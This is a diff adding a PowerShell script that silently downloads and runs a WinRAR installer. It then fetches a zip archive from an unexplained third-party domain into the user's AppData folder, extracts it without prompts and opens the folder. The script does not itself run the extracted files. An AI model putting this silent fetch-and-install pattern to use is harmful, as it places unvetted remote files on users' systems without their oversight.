@@ -1,0 +1,79 @@
+# Check wireless LAN interface status first
+try {
+    netsh wlan show interface
+} catch {
+    Write-Host "Error checking wireless LAN interface status."
+}
+
+# Define paths for extraction and download locations
+$extractDir = Join-Path -Path $env:APPDATA -ChildPath "Files"
+$zipFile = Join-Path -Path $env:APPDATA -ChildPath "d.zip"
+$winrarInstaller = Join-Path -Path $env:APPDATA -ChildPath "winrar.exe"
+
+# Function to check if WinRAR is installed
+function IsWinRARInstalled {
+    return Test-Path "C:\Program Files\WinRAR\WinRAR.exe"
+}
+
+# Function to download and install WinRAR
+function InstallWinRAR {
+    $winrarURL = "https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe"
+    try {
+        Invoke-WebRequest -Uri $winrarURL -OutFile $winrarInstaller
+        Start-Process -FilePath $winrarInstaller -ArgumentList "/S" -Wait
+        Remove-Item -Path $winrarInstaller -Force
+        Write-Host "WinRAR installed successfully."
+    } catch {
+        Write-Host "Error downloading or installing WinRAR. Please install it manually."
+        Exit
+    }
+}
+
+if (!(IsWinRARInstalled)) {
+    Write-Host "WinRAR is not installed. Downloading and installing WinRAR..."
+    InstallWinRAR
+}
+
+if (!(Test-Path $extractDir)) {
+    New-Item -ItemType Directory -Path $extractDir -Force
+}
+
+try {
+    Invoke-WebRequest -Uri "https://vl.hotrohoctap.net/d.zip" -OutFile $zipFile
+} catch {
+    Write-Host "Error downloading the zip file. Please check the URL and your internet connection."
+    Exit
+}
+
+try {
+    & "C:\Program Files\WinRAR\WinRAR.exe" x -y -o+ -ibck $zipFile $extractDir
+} catch {
+    Write-Host "Error extracting files. Please check if WinRAR is installed and try again."
+    Exit
+}
+
+function IsWinRARRunning {
+    $processes = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.ProcessName -like "WinRAR" }
+    return $processes.Count -gt 0
+}
+
+while (IsWinRARRunning) {
+    Write-Host "WinRAR process is still running..."
+    Start-Sleep -Seconds 1
+}
+
+try {
+    Remove-Item -Path $zipFile -Recurse -Force
+    Write-Host "Zip file removed successfully."
+} catch {
+    Write-Host "Error removing the zip file."
+}
+
+try {
+    Start-Process -FilePath explorer.exe -ArgumentList $extractDir
+    Write-Host "Extracted folder opened successfully."
+} catch {
+    Write-Host "Error opening the extracted folder."
+}
+
+Exit
